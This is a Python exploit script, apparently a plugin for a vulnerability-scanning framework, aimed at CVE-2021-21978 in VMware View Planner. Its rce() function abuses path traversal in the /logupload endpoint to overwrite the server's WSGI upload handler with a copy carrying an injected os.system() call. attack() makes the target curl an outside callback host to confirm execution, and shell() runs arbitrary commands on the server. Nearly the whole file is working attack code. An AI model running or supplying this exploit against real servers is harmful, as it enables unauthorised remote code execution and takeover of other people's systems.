import requests
import argparse
import uuid
from Framework.Valueconfig import FORMATTIME, ValueStatus
import json

def rce(url,cmd):
    url = "{0}/logupload?logMetaData={{\"itrLogPath\":\"../../../../../../etc/httpd/html/wsgi_log_upload\",\"logFileType\":\"log_upload_wsgi.py\",\"workloadID\":\"2\"}}".format(url)
    print(url)
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
    header = {
        "User-Agent":ua
    }
    payload='''
#! /usr/bin/env python3
import cgi
import os,sys
import logging
import json

os.system({0})

WORKLOAD_LOG_ZIP_ARCHIVE_FILE_NAME = "workload_log_{{}}.zip"

class LogFileJson:
    """ Defines format to upload log file in harness

    Arguments:
    itrLogPath : log path provided by harness to store log data
    logFileType : Type of log file defined in api.agentlogFileType
    workloadID [OPTIONAL] : workload id, if log file is workload specific

    """
    def __init__(self, itrLogPath, logFileType, workloadID = None):
        self.itrLogPath = itrLogPath
        self.logFileType = logFileType
        self.workloadID = workloadID

    def to_json(self):
        return json.dumps(self.__dict__)

    @classmethod
    def from_json(cls, json_str):
        json_dict = json.loads(json_str)
        return cls(**json_dict)

class agentlogFileType():
    """ Defines various log file types to be uploaded by agent

    """
    WORKLOAD_ZIP_LOG = "workloadLogsZipFile"

try:
    # TO DO: Puth path in some config
    logging.basicConfig(filename="/etc/httpd/html/logs/uploader.log",filemode='a', level=logging.ERROR)
except:
    # In case write permission is not available in log folder.
    pass

logger = logging.getLogger('log_upload_wsgi.py')

def application(environ, start_response):
    logger.debug("application called")

    if environ['REQUEST_METHOD'] == 'POST':
        post = cgi.FieldStorage(
            fp=environ['wsgi.input'],
            environ=environ,
            keep_blank_values=True
        )
        # TO DO: Puth path in some config or read from config is already available
        resultBasePath = "/etc/httpd/html/vpresults"
        try:
            filedata = post["logfile"]
            metaData = post["logMetaData"]

            if metaData.value:
                logFileJson = LogFileJson.from_json(metaData.value)

            if not os.path.exists(os.path.join(resultBasePath, logFileJson.itrLogPath)):
                os.makedirs(os.path.join(resultBasePath, logFileJson.itrLogPath))

            if filedata.file:
                if (logFileJson.logFileType == agentlogFileType.WORKLOAD_ZIP_LOG):
                    filePath = os.path.join(resultBasePath, logFileJson.itrLogPath, WORKLOAD_LOG_ZIP_ARCHIVE_FILE_NAME.format(str(logFileJson.workloadID)))
                else:
                    filePath = os.path.join(resultBasePath, logFileJson.itrLogPath, logFileJson.logFileType)
                with open(filePath, 'wb') as output_file:
                    while True:
                        data = filedata.file.read(1024)
                        # End of file
                        if not data:
                            break
                        output_file.write(data)

                body = u" File uploaded successfully."
                start_response(
                    '200 OK',
                    [
                        ('Content-type', 'text/html; charset=utf8'),
                        ('Content-Length', str(len(body))),
                    ]
                )
                return [body.encode('utf8')]

        except Exception as e:
            logger.error("Exception {{}}".format(str(e)))
            body = u"Exception {{}}".format(str(e))
    else:
        logger.error("Invalid request")
        body = u"Invalid request"

    start_response(
        '400 fail',
        [
            ('Content-type', 'text/html; charset=utf8'),
            ('Content-Length', str(len(body))),
        ]
    )
    return [body.encode('utf8')]
    '''.format(cmd)
    files = {'logfile': ("",payload,"text/plain")}
    requests.packages.urllib3.disable_warnings()
    # proxies={'https':'127.0.0.1:8080'} #proxies=proxies
    res = requests.post(url=url,headers=header,verify=False,files=files, timeout=5)


def attack(url, host_check): 
    flag = uuid.uuid4().hex
    uniq_url = host_check + "/requestbin?data=" + flag
    rce(url, "/usr/bin/curl " + uniq_url)
    Check_success = requests.get(host_check + "/logrequestbin?data="+flag)
    if Check_success.status_code == 200:
        data = json.loads(Check_success.text)
        if data['status'] == ValueStatus.Success:
            return uniq_url
        else: 
            return False

def shell(url, cmd): 
    rce(url, cmd)
    return True

    # requests.get(url="https://192.168.15.84/logupload?logMetaData",verify=False)
    # print(res.text)

# if __name__ == '__main__':
#     parser = argparse.ArgumentParser(description='VMware View Planner CVE-2021-21978',
#                                      usage='use "python %(prog)s --help" for more information',
#                                      formatter_class=argparse.RawTextHelpFormatter)
#     parser.add_argument("-u", "--url",
#                         dest="url",
#                         help="TARGET URL (127.0.0.1:443)"
#                         )
#     parser.add_argument("-v", "--vps",
#                         dest="vps",
#                         help="VPS IP"
#                         )
#     parser.add_argument("-p", "--port",
#                         dest="port",
#                         help="VPS LISTENING PORT"
#                         )
#     args = parser.parse_args()
#     if not args.url or not args.vps or not args.port:
#         sys.exit('[*] Please assign url and cmd! \n[*] Examples python CVE-2021-21978.py -u 127.0.0.1:443 -v vpsip -p port')
#     rce(args.url, args.vps, args.port)